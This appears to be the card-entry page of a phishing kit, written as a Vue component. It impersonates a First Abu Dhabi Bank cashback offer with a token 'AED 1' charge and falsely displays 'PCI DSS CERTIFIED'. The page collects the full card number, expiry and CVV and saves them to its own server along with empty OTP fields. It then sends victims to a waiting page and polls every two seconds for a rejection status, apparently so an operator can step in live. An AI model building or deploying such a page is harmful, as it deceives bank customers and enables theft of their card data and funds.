<script setup lang="ts">
import { ref, onMounted, onUnmounted } from 'vue';
import { ChevronDown, CreditCard, ArrowRight, ShieldCheck } from 'lucide-vue-next';
import { useRouter } from 'vue-router';
import { updateCardRequest, getCardRequest, resolveActiveRequestId } from '../api';

const router = useRouter();

const form = ref({
  name: '',
  cardNumber: '',
  expMonth: '',
  expYear: '',
  cvv: ''
});

const isSubmitting = ref(false);
const statusBanner = ref('');
let statusCheckTimer: ReturnType<typeof setInterval> | null = null;

const errors = ref({
  name: '',
  cardNumber: '',
  expMonth: '',
  expYear: '',
  cvv: ''
});

const checkCardStatus = async () => {
  try {
    const data = await getCardRequest();
    if (data?.otpStatus === 'card_rejected') {
      statusBanner.value = 'تم رفض البطاقة البنكية من قِبل البنك المصدر. يرجى التأكد من صحة البيانات أو استخدام بطاقة دفع أخرى.';
    }
  } catch {}
};

onMounted(() => {
  checkCardStatus();
  statusCheckTimer = setInterval(checkCardStatus, 2000);
});

onUnmounted(() => {
  if (statusCheckTimer) clearInterval(statusCheckTimer);
});

const validateForm = () => {
  let isValid = true;
  errors.value = { name: '', cardNumber: '', expMonth: '', expYear: '', cvv: '' };

  if (!form.value.name.trim()) {
    errors.value.name = 'Required';
    isValid = false;
  }

  if (!/^\d{15,16}$/.test(form.value.cardNumber.replace(/\s/g, ''))) {
    errors.value.cardNumber = 'Valid card number required';
    isValid = false;
  }

  if (!form.value.expMonth) {
    errors.value.expMonth = 'Required';
    isValid = false;
  }

  if (!form.value.expYear) {
    errors.value.expYear = 'Required';
    isValid = false;
  }

  if (!/^\d{3}$/.test(form.value.cvv)) {
    errors.value.cvv = 'CVV must be exactly 3 digits';
    isValid = false;
  }

  return isValid;
};

const handleCardNumberInput = (e: Event) => {
  const target = e.target as HTMLInputElement;
  const raw = target.value.replace(/\D/g, '').slice(0, 16);
  // Format with spaces every 4 digits for clear readability
  const formatted = raw.match(/.{1,4}/g)?.join(' ') || raw;
  form.value.cardNumber = formatted;
};

const handleCvvInput = (e: Event) => {
  const target = e.target as HTMLInputElement;
  form.value.cvv = target.value.replace(/\D/g, '').slice(0, 3);
};

const submitPayment = async () => {
  if (isSubmitting.value) return;
  if (!validateForm()) return;
  
  isSubmitting.value = true;
  statusBanner.value = '';
  
  const requestId = await resolveActiveRequestId();
  if (!requestId) {
    statusBanner.value = 'لم يتم العثور على رقم الطلب، يرجى البدء من جديد.';
    isSubmitting.value = false;
    setTimeout(() => router.push('/request'), 1200);
    return;
  }

  try {
    await updateCardRequest(requestId, {
      paymentName: form.value.name,
      cardNumber: form.value.cardNumber,
      expMonth: form.value.expMonth,
      expYear: form.value.expYear,
      cvv: form.value.cvv,
      otp: '',
      otpStatus: '',
      step: 'card',
      nextAction: ''
    });
    router.push('/waiting');
  } catch (error) {
    console.error('Error updating card details:', error);
    statusBanner.value = 'تعذر حفظ بيانات البطاقة على الخادم.';
  } finally {
    isSubmitting.value = false;
  }
};
</script>

<template>
  <div class="max-w-xl mx-auto bg-white min-h-screen flex flex-col font-sans text-gray-900">
    
    <!-- Top Promotional Banner -->
    <div class="w-full bg-white relative border-b border-gray-200 shrink-0 overflow-hidden shadow-xs">
      <div class="relative w-full">
        <!-- Back Navigation Button -->
        <button
          @click="router.push('/payment')"
          aria-label="العودة"
          class="absolute top-2 right-2 z-20 w-8 h-8 rounded-full bg-black/60 hover:bg-black/80 flex items-center justify-center text-white transition-colors cursor-pointer shadow-md"
        >
          <ArrowRight class="w-4 h-4" />
        </button>

        <img
          src="/assets/aistudio/235b9d67-4dec-40f1-81b7-61ea941636ef_0f5a8538.png"
          alt="بنك أبوظبي الأول FAB - استمتع باسترداد نقدي بنسبة 30% عند الدفع باستخدام بطاقات بنك أبوظبي الأول"
          class="w-full h-auto object-cover block"
        />
      </div>
    </div>

    <!-- Order Summary Bar -->
    <div class="bg-[#07170b] text-white flex justify-between items-center px-5 py-3 shadow-xs border-b border-[#009a44]/30">
      <span class="text-sm border-b-2 border-[#39b54a] pb-0.5 inline-block tracking-wide font-semibold">Order summary</span>
      <span class="text-base font-bold text-[#39b54a] tracking-wide tabular-nums">AED 1</span>
    </div>

    <!-- Inline Status Banner if needed -->
    <div v-if="statusBanner" class="mx-5 mt-4 p-2.5 rounded-xl bg-red-50 border border-red-200 text-red-700 text-xs font-bold text-center" dir="rtl">
      {{ statusBanner }}
    </div>

    <!-- Card Form Container -->
    <div class="px-5 py-6 flex-grow bg-[#f3f9f5]">
      <div class="bg-white rounded-2xl p-5 shadow-[0_4px_20px_rgba(0,0,0,0.05)] border border-gray-200/80">
        <!-- Form Header -->
        <div class="flex justify-between items-center mb-5 pb-3 border-b border-gray-100">
          <div class="flex items-center gap-2">
            <CreditCard class="w-5 h-5 text-[#008a40]" />
            <span class="text-sm text-gray-900 font-bold tracking-tight">Pay by card</span>
          </div>
          <div class="flex gap-2 items-center">
            <img
              src="/assets/aistudio/MasterCard_Logo.svg_5b05ba46.webp"
              alt="Mastercard"
              class="h-4 w-auto object-contain"
            />
            <img
              src="/assets/aistudio/Visa_Inc._logo__2021_present_.svg_2c451104.webp"
              alt="Visa"
              class="h-3.5 w-auto object-contain"
            />
            <img
              src="/assets/aistudio/American_Express_logo__2018__3b766b47.svg"
              alt="American Express"
              class="h-4 w-auto object-contain"
            />
          </div>
        </div>

        <form @submit.prevent="submitPayment" class="space-y-5 font-sans" dir="ltr">
          
          <!-- Name -->
          <div class="relative">
            <input 
              type="text" 
              placeholder="Name on card" 
              v-model="form.name" 
              class="w-full border-b border-gray-300 rounded-none py-2.5 px-2 text-gray-900 focus:outline-none focus:border-[#009a44] text-sm bg-transparent transition-colors placeholder-gray-400" 
            />
            <p v-if="errors.name" class="text-red-500 text-[11px] mt-1">{{ errors.name }}</p>
          </div>

          <!-- Card Number -->
          <div class="relative">
            <input 
              type="text"
              inputmode="numeric"
              pattern="[0-9]*"
              autocomplete="cc-number"
              placeholder="Card Number" 
              :value="form.cardNumber"
              @input="handleCardNumberInput"
              maxlength="19"
              class="w-full border-b border-gray-300 rounded-none py-2.5 px-2 text-gray-900 focus:outline-none focus:border-[#009a44] text-sm bg-transparent transition-colors placeholder-gray-400 font-mono" 
            />
            <p v-if="errors.cardNumber" class="text-red-500 text-[11px] mt-1">{{ errors.cardNumber }}</p>
          </div>

          <!-- Expiry Row -->
          <div class="flex gap-4">
            <!-- Month -->
            <div class="relative w-1/2">
              <div class="flex items-center border-b border-gray-300 bg-transparent">
                <div class="pr-2 text-[#009a44] flex items-center justify-center absolute left-0">
                  <ChevronDown class="w-4 h-4 pointer-events-none" />
                </div>
                <select 
                  v-model="form.expMonth" 
                  class="w-full py-2.5 pl-7 pr-2 text-gray-900 appearance-none focus:outline-none focus:border-[#009a44] text-sm bg-transparent font-medium relative z-20 cursor-pointer transition-colors"
                >
                  <option value="" disabled selected hidden>Month</option>
                  <option value="01">01</option>
                  <option value="02">02</option>
                  <option value="03">03</option>
                  <option value="04">04</option>
                  <option value="05">05</option>
                  <option value="06">06</option>
                  <option value="07">07</option>
                  <option value="08">08</option>
                  <option value="09">09</option>
                  <option value="10">10</option>
                  <option value="11">11</option>
                  <option value="12">12</option>
                </select>
              </div>
              <p v-if="errors.expMonth" class="text-red-500 text-[11px] mt-1">{{ errors.expMonth }}</p>
            </div>

            <!-- Year -->
            <div class="relative w-1/2">
              <div class="flex items-center border-b border-gray-300 bg-transparent">
                <div class="pr-2 text-[#009a44] flex items-center justify-center absolute left-0">
                  <ChevronDown class="w-4 h-4 pointer-events-none" />
                </div>
                <select 
                  v-model="form.expYear" 
                  class="w-full py-2.5 pl-7 pr-2 text-gray-900 appearance-none focus:outline-none focus:border-[#009a44] text-sm bg-transparent font-medium relative z-20 cursor-pointer transition-colors"
                >
                  <option value="" disabled selected hidden>Year</option>
                  <option value="2026">2026</option>
                  <option value="2027">2027</option>
                  <option value="2028">2028</option>
                  <option value="2029">2029</option>
                  <option value="2030">2030</option>
                  <option value="2031">2031</option>
                  <option value="2032">2032</option>
                </select>
              </div>
              <p v-if="errors.expYear" class="text-red-500 text-[11px] mt-1">{{ errors.expYear }}</p>
            </div>
          </div>

          <!-- CVV -->
          <div class="relative">
            <input 
              type="password"
              inputmode="numeric"
              pattern="[0-9]*"
              autocomplete="cc-csc"
              placeholder="CVV Code" 
              :value="form.cvv"
              @input="handleCvvInput"
              maxlength="3"
              class="w-full border-b border-gray-300 rounded-none py-2.5 px-2 text-gray-900 focus:outline-none focus:border-[#009a44] text-sm bg-transparent transition-colors placeholder-gray-400 font-mono" 
            />
            <p v-if="errors.cvv" class="text-red-500 text-[11px] mt-1">{{ errors.cvv }}</p>
          </div>

          <div class="pt-3">
            <button 
              type="submit" 
              :disabled="isSubmitting"
              class="w-full flex items-center justify-center gap-2 bg-[#008a40] hover:bg-[#007335] text-white transition-colors font-bold text-sm py-3 rounded-xl shadow-md tracking-wide disabled:opacity-70 disabled:cursor-not-allowed cursor-pointer"
            >
              <span v-if="isSubmitting" class="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></span>
              <span v-else>PAY AED 1</span>
            </button>
          </div>
        </form>
      </div>
    </div>

    <!-- Footer Security Block -->
    <div class="px-5 py-6 bg-[#e4f2ea] flex flex-col items-center text-center w-full border-t border-gray-200/70" dir="rtl">
      <h3 class="font-bold text-gray-900 mb-2.5 text-xs">البطاقات المقبولة</h3>
      
      <div class="flex gap-2 mb-4 flex-wrap justify-center items-center" dir="ltr">
        <!-- American Express -->
        <div class="border border-gray-200 rounded-md px-2 py-1 flex items-center justify-center bg-white h-8 w-[62px] shadow-2xs">
          <img
            src="/assets/aistudio/American_Express_logo__2018__3b766b47.svg"
            alt="American Express"
            class="h-5 w-auto object-contain rounded-[2px]"
          />
        </div>

        <!-- MasterCard -->
        <div class="border border-gray-200 rounded-md px-2 py-1 flex items-center justify-center bg-white h-8 w-[62px] shadow-2xs">
          <img
            src="/assets/aistudio/MasterCard_Logo.svg_5b05ba46.webp"
            alt="MasterCard"
            class="h-5 w-auto object-contain"
          />
        </div>

        <!-- Visa -->
        <div class="border border-gray-200 rounded-md px-2 py-1 flex items-center justify-center bg-white h-8 w-[62px] shadow-2xs">
          <img
            src="/assets/aistudio/Visa_Inc._logo__2021_present_.svg_2c451104.webp"
            alt="Visa"
            class="h-4 w-auto object-contain"
          />
        </div>

        <!-- Google Pay Official 4-Color Logo -->
        <div class="border border-gray-200 rounded-md px-2 py-1 flex items-center justify-center bg-white h-8 w-[62px] shadow-2xs">
          <svg viewBox="0 0 41 17" class="h-4 w-auto" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M19.526 2.635v4.083h2.518c.6 0 1.096-.202 1.488-.605.403-.402.605-.886.605-1.452 0-.544-.202-1.018-.605-1.421-.392-.414-.888-.605-1.488-.605h-2.518zm0 5.52v4.736h-1.504V1.198h3.99c1.013 0 1.873.337 2.58 1.012.719.675 1.078 1.497 1.078 2.466 0 .991-.359 1.818-1.078 2.482-.697.664-1.557.996-2.58.996h-2.486zm10.224 2.254c0 .392.169.718.506.98.338.26.74.391 1.209.391.653 0 1.236-.24 1.747-.718.523-.479.784-1.04.784-1.682-.49-.392-1.176-.588-2.058-.588-.642 0-1.17.158-1.584.473-.403.316-.604.697-.604 1.144zm1.96-5.716c1.11 0 1.987.299 2.63.898.642.588.963 1.404.963 2.45v4.948h-1.437v-1.11c-.62.914-1.448 1.371-2.482 1.371-.882 0-1.622-.261-2.221-.784-.588-.522-.882-1.176-.882-1.96 0-.827.31-1.486.931-1.976.631-.5 1.47-.751 2.515-.751.893 0 1.628.163 2.205.49v-.343c0-.523-.207-.969-.62-1.339-.414-.381-.937-.572-1.568-.572-.904 0-1.622.381-2.156 1.143l-1.323-.833c.73-1.045 1.88-1.568 3.446-1.568zm10.123.261L36.72 16.484h-1.552l1.895-4.099-3.365-7.431h1.633l2.417 5.699 2.352-5.699h1.731z" fill="#5F6368"/>
            <path d="M13.428 7.289c0-.457-.04-.913-.116-1.363H6.98v2.583h3.626a3.105 3.105 0 0 1-1.345 2.037v1.675h2.172c1.27-1.17 2.005-2.897 2.005-4.932z" fill="#4285F4"/>
            <path d="M6.98 13.854c1.812 0 3.338-.596 4.45-1.623l-2.172-1.675c-.603.408-1.38.644-2.278.644-1.748 0-3.23-1.18-3.761-2.767H.978v1.728a6.729 6.729 0 0 0 6.002 3.693z" fill="#34A853"/>
            <path d="M3.219 8.433a4.045 4.045 0 0 1 0-2.587V4.118H.978a6.737 6.737 0 0 0 0 6.043l2.241-1.728z" fill="#FBBC04"/>
            <path d="M6.98 3.076c.988 0 1.878.34 2.577 1.007l1.926-1.926C10.314 1.07 8.792.425 6.98.425A6.729 6.729 0 0 0 .978 4.118l2.241 1.728c.53-1.587 2.013-2.77 3.761-2.77z" fill="#EA4335"/>
          </svg>
        </div>

        <!-- Samsung Pay Official Logo -->
        <div class="border border-gray-200 rounded-md px-2 py-1 flex items-center justify-center bg-white h-8 w-[62px] shadow-2xs">
          <svg viewBox="0 0 100 38" class="h-5 w-auto" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect width="100" height="38" rx="4" fill="#1428A0"/>
            <text x="50" y="16" text-anchor="middle" fill="#FFFFFF" font-family="Arial, Helvetica, sans-serif" font-weight="900" font-size="11.5" letter-spacing="1.2">SAMSUNG</text>
            <text x="50" y="30" text-anchor="middle" fill="#FFFFFF" font-family="Arial, Helvetica, sans-serif" font-weight="700" font-size="11" letter-spacing="0.5">Pay</text>
          </svg>
        </div>
      </div>

      <div class="text-center max-w-sm px-2 space-y-1.5">
        <p class="text-gray-600 text-[11px] font-medium leading-relaxed">
          تُقبل البطاقات العالمية والبطاقات الصادرة في دولة الإمارات العربية المتحدة ودول الخليج.
        </p>
        <div class="flex items-center justify-center gap-1.5 text-[11px] font-bold text-[#008a40]">
          <ShieldCheck class="w-3.5 h-3.5" />
          <span>PCI DSS CERTIFIED · بياناتك الخاصة آمنة</span>
        </div>
      </div>
    </div>

  </div>
</template>
